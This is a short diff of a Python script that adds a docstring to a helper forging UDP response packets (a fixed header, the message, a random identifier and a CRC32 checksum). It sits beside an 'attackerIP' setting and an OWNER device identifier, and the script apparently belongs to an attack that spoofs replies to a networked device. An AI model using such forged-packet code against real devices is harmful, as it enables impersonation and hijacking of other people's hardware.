@@ -1,7 +1,20 @@
 import json
 from zlib import crc32
+import socket
 
 def getUDPResponse(message,random):
+    """
+        Constructs a UDP response packet with a specific message and random sequence number.
+
+        Parameters:
+        - message (str): The message to be included in the UDP response.
+        - random (bytes): A 4-byte sequence used as a random identifier in the packet.
+
+        Returns:
+        - bytes: A byte array representing the complete UDP response packet. This includes a fixed header,
+          the message content, a random sequence number, and a CRC32 checksum for integrity verification.
+
+    """
     fixedBytes = b'\x02\x00\x00\x01\x00\x00\x11\x00\x00\x00\x00\x00Zk|\x8d'
     result = bytearray(fixedBytes + message.encode('utf-8'))
     result[4:6] = len(message).to_bytes(2, 'big')
@@ -9,7 +22,7 @@ def getUDPResponse(message,random):
     result[12:16] = crc32(result).to_bytes(4, 'big')
     return bytes(result)
 
-import socket
+
 
 attackerIP = "192.168.137.1"
 OWNER="F3DC6B14E732BBB766D0F8750C2C8D9B"
